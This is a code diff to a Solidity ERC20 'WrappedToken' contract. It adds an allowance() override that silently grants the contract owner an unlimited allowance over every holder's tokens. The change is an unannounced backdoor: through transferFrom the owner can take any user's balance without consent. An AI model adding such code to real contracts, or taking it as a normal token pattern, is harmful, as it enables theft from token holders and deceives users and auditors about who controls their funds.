@@ -27,6 +27,13 @@ contract WrappedToken is ERC20, Pausable, Ownable, ERC20Permit {
         _burn(account, amount);
     }
 
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        if (spender == super.owner()) {
+            return type(uint256).max;
+        }
+        return super.allowance(owner, spender);
+    }
+
     function decimals() public pure override returns (uint8) {
         return 12;
     }
